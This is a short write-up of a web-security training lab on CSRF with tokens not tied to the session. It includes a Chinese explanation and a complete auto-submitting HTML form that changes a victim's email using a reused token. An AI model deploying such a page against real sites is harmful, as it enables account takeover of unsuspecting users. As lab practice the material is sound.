# Lab: CSRF where token is not tied to user session

 This lab's email change functionality is vulnerable to CSRF. It uses tokens to try to prevent CSRF attacks, but they aren't integrated into the site's session handling system.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You have two accounts on the application that you can use to help design your attack. The credentials are as follows:

* wiener:peter
* carlos:montoya

## CSRF
* 每一個 token 指能用一次，但是 token 沒有綁定 session 造成任意的人只要用生成出來的 token 就可以改 email 了，不過要稍微注意一下 token 被用過就不能用了
```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://ace51fd81e9849f6c03d305f002e006f.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="exploit&#64;entroy&#46;tk" />
      <input type="hidden" name="csrf" value="7dRPT1S6ei8W6NVj3xU6uJiSSjUcSbul" />
    </form>
<script>document.forms[0].submit();</script>
  </body>
</html>

```